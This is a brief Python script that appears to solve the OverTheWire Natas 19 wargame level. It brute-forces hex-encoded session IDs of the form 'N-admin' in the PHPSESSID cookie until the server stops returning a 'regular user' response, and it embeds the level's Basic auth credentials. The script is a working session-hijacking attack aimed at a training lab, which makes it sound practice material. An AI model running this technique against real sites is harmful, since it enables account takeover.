#! /usr/bin/env python3
import string
import urllib.parse
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
headersOG = {'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==', 'Cookie': 'PHPSESSID={sessionId}'}
data = {'username': 'admin', 'password': '0nw3d'}
tries = {}
tot = 0
for x in range(1,10000):
    tot+=1
    tHeaders = dict(headersOG)
    tHeaders['Cookie'] = tHeaders['Cookie'].format(sessionId=bytes(str(x)+"-admin", "utf-8").hex())
    responseOG = requests.post(url, data=data, headers=tHeaders, timeout=5)
    print (x, tHeaders['Cookie'])
    if ('regular user' not in responseOG.text):
        print(responseOG.text)
        break
